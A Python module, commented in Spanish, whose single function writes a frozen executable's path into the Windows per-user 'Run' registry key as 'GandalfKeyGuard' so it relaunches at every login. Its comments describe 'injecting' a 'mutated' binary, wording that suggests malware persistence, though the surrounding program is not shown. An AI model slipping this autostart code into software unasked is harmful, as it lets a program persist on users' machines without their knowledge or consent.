import sys
import os
import logging

# Intenta importar winreg solo si está en Windows para evitar crashes en otros sistemas
try:
    import winreg
except ImportError:
    winreg = None

logger = logging.getLogger(__name__)


def ensure_persistence():
    # Inyecta el binario en la clave de registro 'Run' de Windows para garantizar su inicio con el sistema operativo.
    # 1. Si no es un ejecutable congelado (PyInstaller) o no esta en Windows, sigue.
    if not getattr(sys, 'frozen', False) or winreg is None:
        return

    try:
        # Ruta absoluta del ejecutable mutado en el disco local
        exe_path = os.path.abspath(sys.executable)

        # Abre el registro a nivel de usuario (sin requerir permisos de Administrador)
        registry_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )

        # Registra a Gandalf con un identificador único
        winreg.SetValueEx(registry_key, "GandalfKeyGuard", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(registry_key)

        logger.info("Persistencia inyectada con éxito en Windows.")
        return True
    except Exception as e:
        logger.error(f"Error al configurar la persistencia en el arranque: {e}")
        return False
